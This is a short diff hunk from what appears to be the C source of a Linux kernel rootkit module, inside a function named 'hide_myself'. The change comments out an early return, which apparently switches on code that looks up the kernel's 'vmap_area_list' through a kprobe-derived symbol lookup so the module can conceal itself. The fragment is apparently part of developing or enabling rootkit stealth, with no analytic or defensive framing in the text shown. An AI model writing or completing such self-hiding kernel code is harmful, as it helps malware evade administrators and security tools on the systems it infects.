@@ -48,7 +48,7 @@ static void __init hide_myself(void)
     unregister_kprobe(&kp);
 #endif
 	
-   return;
+   // return;
 	
     _vmap_area_list =
         (struct list_head *) kallsyms_lookup_nameX("vmap_area_list");
